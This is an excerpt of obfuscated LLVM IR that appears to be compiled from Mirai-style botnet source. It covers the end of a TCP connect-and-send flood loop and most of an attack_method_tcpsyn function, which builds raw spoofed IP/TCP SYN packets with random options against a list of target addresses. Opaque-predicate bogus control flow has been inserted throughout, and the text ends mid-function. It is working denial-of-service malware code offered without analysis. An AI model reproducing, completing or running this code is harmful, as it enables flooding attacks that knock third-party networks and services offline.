  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %255

; <label>:255:                                    ; preds = %originalBBpart240, %originalBBpart229
  %256 = load i32, i32* %9, align 4
  %257 = load i8, i8* %5, align 1
  %258 = zext i8 %257 to i32
  %259 = icmp slt i32 %256, %258
  br i1 %259, label %260, label %317

; <label>:260:                                    ; preds = %255
  %261 = load i8**, i8*** %10, align 8
  %262 = load i32, i32* %9, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds i8*, i8** %261, i64 %263
  %265 = load i8*, i8** %264, align 8
  store i8* %265, i8** %22, align 8
  %266 = load i8, i8* %15, align 1
  %267 = icmp ne i8 %266, 0
  br i1 %267, label %268, label %288

; <label>:268:                                    ; preds = %260
  %269 = load i32, i32* @x.23
  %270 = load i32, i32* @y.24
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %268
  %277 = load i8*, i8** %22, align 8
  %278 = load i16, i16* %14, align 2
  %279 = zext i16 %278 to i32
  call void @rand_str(i8* %277, i32 %279)
  %280 = load i32, i32* @x.23
  %281 = load i32, i32* @y.24
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %288

; <label>:288:                                    ; preds = %originalBBpart233, %260
  %289 = load i32*, i32** %11, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i32, i32* %289, i64 %291
  %293 = load i32, i32* %292, align 4
  %294 = load i8*, i8** %22, align 8
  %295 = load i16, i16* %14, align 2
  %296 = zext i16 %295 to i64
  %297 = call i64 @send(i32 %293, i8* %294, i64 %296, i32 16384)
  br label %298

; <label>:298:                                    ; preds = %288
  %299 = load i32, i32* @x.23
  %300 = load i32, i32* @y.24
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %298
  %307 = load i32, i32* %9, align 4
  %308 = add nsw i32 %307, 1
  store i32 %308, i32* %9, align 4
  %309 = load i32, i32* @x.23
  %310 = load i32, i32* @y.24
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBBpart240, label %originalBB35alteredBB

originalBBpart240:                                ; preds = %originalBB35
  br label %255

; <label>:317:                                    ; preds = %255
  br label %238

originalBBalteredBB:                              ; preds = %originalBB, %58
  %318 = load i32, i32* %9, align 4
  %319 = load i8, i8* %5, align 1
  %320 = zext i8 %319 to i32
  %321 = icmp slt i32 %318, %320
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %113
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %157
  %322 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %323 = load i32, i32* %9, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i64 %324
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i32 0, i32 1
  %327 = load i32, i32* %326, align 4
  %328 = call i32 @ntohl(i32 %327) #7
  %329 = call i32 @rand_next()
  %330 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %331 = load i32, i32* %9, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %330, i64 %332
  %334 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %333, i32 0, i32 2
  %335 = load i8, i8* %334, align 4
  %336 = zext i8 %335 to i32
  %_ = sub i32 0, %329
  %gen = add i32 %_, %336
  %_7 = shl i32 %329, %336
  %_8 = shl i32 %329, %336
  %_9 = shl i32 %329, %336
  %_10 = shl i32 %329, %336
  %_11 = shl i32 %329, %336
  %_12 = sub i32 0, %329
  %gen13 = add i32 %_12, %336
  %_14 = sub i32 0, %329
  %gen15 = add i32 %_14, %336
  %337 = lshr i32 %329, %336
  %_16 = sub i32 %328, %337
  %gen17 = mul i32 %_16, %337
  %_18 = shl i32 %328, %337
  %_19 = shl i32 %328, %337
  %338 = add i32 %328, %337
  %339 = call i32 @htonl(i32 %338) #7
  %340 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %341 = load i32, i32* %9, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %340, i64 %342
  %344 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %343, i32 0, i32 0
  %345 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %344, i32 0, i32 2
  %346 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %345, i32 0, i32 0
  store i32 %339, i32* %346, align 4
  br label %originalBB6

originalBB23alteredBB:                            ; preds = %originalBB23, %199
  %347 = load i32*, i32** %11, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds i32, i32* %347, i64 %349
  %351 = load i32, i32* %350, align 4
  %352 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %353 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %354 = load i32, i32* %9, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %353, i64 %355
  %357 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %356, i32 0, i32 0
  %358 = bitcast %struct.sockaddr_in* %357 to %struct.sockaddr*
  store %struct.sockaddr* %358, %struct.sockaddr** %352, align 8
  %359 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %360 = load %struct.sockaddr*, %struct.sockaddr** %359, align 8
  %361 = call i32 @connect(i32 %351, %struct.sockaddr* %360, i32 16)
  %362 = icmp eq i32 %361, -1
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %238
  store i32 0, i32* %9, align 4
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %268
  %363 = load i8*, i8** %22, align 8
  %364 = load i16, i16* %14, align 2
  %365 = zext i16 %364 to i32
  call void @rand_str(i8* %363, i32 %365)
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %298
  %366 = load i32, i32* %9, align 4
  %_36 = shl i32 %366, 1
  %_37 = sub i32 0, %366
  %gen38 = add i32 %_37, 1
  %367 = add nsw i32 %366, 1
  store i32 %367, i32* %9, align 4
  br label %originalBB35
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %115

; <label>:98:                                     ; preds = %4
  %99 = load i32, i32* @x.25
  %100 = load i32, i32* @y.26
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %98
  %107 = load i32, i32* @x.25
  %108 = load i32, i32* @y.26
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %581

; <label>:115:                                    ; preds = %4
  %116 = load i32, i32* @x.25
  %117 = load i32, i32* @y.26
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %115
  store i32 1, i32* %9, align 4
  %124 = load i32, i32* %10, align 4
  %125 = bitcast i32* %9 to i8*
  %126 = call i32 @setsockopt(i32 %124, i32 0, i32 3, i8* %125, i32 4) #6
  %127 = icmp eq i32 %126, -1
  %128 = load i32, i32* @x.25
  %129 = load i32, i32* @y.26
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %127, label %136, label %139

; <label>:136:                                    ; preds = %originalBBpart24
  %137 = load i32, i32* %10, align 4
  %138 = call i32 @close(i32 %137)
  br label %581

; <label>:139:                                    ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %140

; <label>:140:                                    ; preds = %originalBBpart210, %139
  %141 = load i32, i32* %9, align 4
  %142 = load i8, i8* %5, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp slt i32 %141, %143
  br i1 %144, label %145, label %336

; <label>:145:                                    ; preds = %140
  %146 = call noalias i8* @calloc(i64 128, i64 1) #6
  %147 = load i8**, i8*** %11, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i8*, i8** %147, i64 %149
  store i8* %146, i8** %150, align 8
  %151 = load i8**, i8*** %11, align 8
  %152 = load i32, i32* %9, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds i8*, i8** %151, i64 %153
  %155 = load i8*, i8** %154, align 8
  %156 = bitcast i8* %155 to %struct.iphdr*
  store %struct.iphdr* %156, %struct.iphdr** %27, align 8
  %157 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i64 1
  %159 = bitcast %struct.iphdr* %158 to %struct.tcphdr*
  store %struct.tcphdr* %159, %struct.tcphdr** %28, align 8
  %160 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %161 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %160, i64 1
  %162 = bitcast %struct.tcphdr* %161 to i8*
  store i8* %162, i8** %29, align 8
  %163 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %164 = bitcast %struct.iphdr* %163 to i8*
  %165 = load i8, i8* %164, align 4
  %166 = and i8 %165, 15
  %167 = or i8 %166, 64
  store i8 %167, i8* %164, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = bitcast %struct.iphdr* %168 to i8*
  %170 = load i8, i8* %169, align 4
  %171 = and i8 %170, -16
  %172 = or i8 %171, 5
  store i8 %172, i8* %169, align 4
  %173 = load i8, i8* %12, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 1
  store i8 %173, i8* %175, align 1
  %176 = call zeroext i16 @htons(i16 zeroext 60) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 2
  store i16 %176, i16* %178, align 2
  %179 = load i16, i16* %13, align 2
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i8, i8* %14, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 5
  store i8 %183, i8* %185, align 4
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

; <label>:188:                                    ; preds = %145
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %188, %145
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 6
  store i8 6, i8* %194, align 1
  %195 = load i32, i32* %26, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 8
  store i32 %195, i32* %197, align 4
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 9
  store i32 %203, i32* %205, align 4
  %206 = load i16, i16* %16, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  store i16 %207, i16* %209, align 4
  %210 = load i16, i16* %17, align 2
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* %18, align 4
  %215 = trunc i32 %214 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = zext i16 %216 to i32
  %218 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 2
  store i32 %217, i32* %219, align 4
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %222, -241
  %224 = or i16 %223, 160
  store i16 %224, i16* %221, align 4
  %225 = load i8, i8* %20, align 1
  %226 = sext i8 %225 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %226, 1
  %231 = shl i16 %230, 13
  %232 = and i16 %229, -8193
  %233 = or i16 %232, %231
  store i16 %233, i16* %228, align 4
  %234 = load i8, i8* %21, align 1
  %235 = sext i8 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %235, 1
  %240 = shl i16 %239, 12
  %241 = and i16 %238, -4097
  %242 = or i16 %241, %240
  store i16 %242, i16* %237, align 4
  %243 = load i8, i8* %22, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %244, 1
  %249 = shl i16 %248, 11
  %250 = and i16 %247, -2049
  %251 = or i16 %250, %249
  store i16 %251, i16* %246, align 4
  %252 = load i8, i8* %23, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = and i16 %253, 1
  %258 = shl i16 %257, 10
  %259 = and i16 %256, -1025
  %260 = or i16 %259, %258
  store i16 %260, i16* %255, align 4
  %261 = load i8, i8* %24, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = and i16 %262, 1
  %267 = shl i16 %266, 9
  %268 = and i16 %265, -513
  %269 = or i16 %268, %267
  store i16 %269, i16* %264, align 4
  %270 = load i8, i8* %25, align 1
  %271 = sext i8 %270 to i16
  %272 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 4
  %274 = load i16, i16* %273, align 4
  %275 = and i16 %271, 1
  %276 = shl i16 %275, 8
  %277 = and i16 %274, -257
  %278 = or i16 %277, %276
  store i16 %278, i16* %273, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 2, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 4, i8* %281, align 1
  %283 = call i32 @rand_next()
  %284 = and i32 %283, 15
  %285 = add i32 1400, %284
  %286 = trunc i32 %285 to i16
  %287 = call zeroext i16 @htons(i16 zeroext %286) #7
  %288 = load i8*, i8** %29, align 8
  %289 = bitcast i8* %288 to i16*
  store i16 %287, i16* %289, align 2
  %290 = load i8*, i8** %29, align 8
  %291 = getelementptr inbounds i8, i8* %290, i64 2
  store i8* %291, i8** %29, align 8
  %292 = load i8*, i8** %29, align 8
  %293 = getelementptr inbounds i8, i8* %292, i32 1
  store i8* %293, i8** %29, align 8
  store i8 4, i8* %292, align 1
  %294 = load i8*, i8** %29, align 8
  %295 = getelementptr inbounds i8, i8* %294, i32 1
  store i8* %295, i8** %29, align 8
  store i8 2, i8* %294, align 1
  %296 = load i8*, i8** %29, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %29, align 8
  store i8 8, i8* %296, align 1
  %298 = load i8*, i8** %29, align 8
  %299 = getelementptr inbounds i8, i8* %298, i32 1
  store i8* %299, i8** %29, align 8
  store i8 10, i8* %298, align 1
  %300 = call i32 @rand_next()
  %301 = load i8*, i8** %29, align 8
  %302 = bitcast i8* %301 to i32*
  store i32 %300, i32* %302, align 4
  %303 = load i8*, i8** %29, align 8
  %304 = getelementptr inbounds i8, i8* %303, i64 4
  store i8* %304, i8** %29, align 8
  %305 = load i8*, i8** %29, align 8
  %306 = bitcast i8* %305 to i32*
  store i32 0, i32* %306, align 4
  %307 = load i8*, i8** %29, align 8
  %308 = getelementptr inbounds i8, i8* %307, i64 4
  store i8* %308, i8** %29, align 8
  %309 = load i8*, i8** %29, align 8
  %310 = getelementptr inbounds i8, i8* %309, i32 1
  store i8* %310, i8** %29, align 8
  store i8 1, i8* %309, align 1
  %311 = load i8*, i8** %29, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %29, align 8
  store i8 3, i8* %311, align 1
  %313 = load i8*, i8** %29, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %29, align 8
  store i8 3, i8* %313, align 1
  %315 = load i8*, i8** %29, align 8
  %316 = getelementptr inbounds i8, i8* %315, i32 1
  store i8* %316, i8** %29, align 8
  store i8 6, i8* %315, align 1
  br label %317

; <label>:317:                                    ; preds = %192
  %318 = load i32, i32* @x.25
  %319 = load i32, i32* @y.26
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %317
  %326 = load i32, i32* %9, align 4
  %327 = add nsw i32 %326, 1
  store i32 %327, i32* %9, align 4
  %328 = load i32, i32* @x.25
  %329 = load i32, i32* @y.26
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br label %140

; <label>:336:                                    ; preds = %140
  %337 = load i32, i32* @x.25
  %338 = load i32, i32* @y.26
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %336
  %345 = load i32, i32* @x.25
  %346 = load i32, i32* @y.26
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %353

; <label>:353:                                    ; preds = %580, %originalBBpart214
  store i32 0, i32* %9, align 4
  br label %354

; <label>:354:                                    ; preds = %originalBBpart250, %353
  %355 = load i32, i32* %9, align 4
  %356 = load i8, i8* %5, align 1
  %357 = zext i8 %356 to i32
  %358 = icmp slt i32 %355, %357
  br i1 %358, label %359, label %580

; <label>:359:                                    ; preds = %354
  %360 = load i8**, i8*** %11, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds i8*, i8** %360, i64 %362
  %364 = load i8*, i8** %363, align 8
  store i8* %364, i8** %30, align 8
  %365 = load i8*, i8** %30, align 8
  %366 = bitcast i8* %365 to %struct.iphdr*
  store %struct.iphdr* %366, %struct.iphdr** %31, align 8
  %367 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i64 1
  %369 = bitcast %struct.iphdr* %368 to %struct.tcphdr*
  store %struct.tcphdr* %369, %struct.tcphdr** %32, align 8
  %370 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %371 = load i32, i32* %9, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i64 %372
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i32 0, i32 2
  %375 = load i8, i8* %374, align 4
  %376 = zext i8 %375 to i32
  %377 = icmp slt i32 %376, 32
  br i1 %377, label %378, label %399

; <label>:378:                                    ; preds = %359
  %379 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %380 = load i32, i32* %9, align 4
  %381 = sext i32 %380 to i64
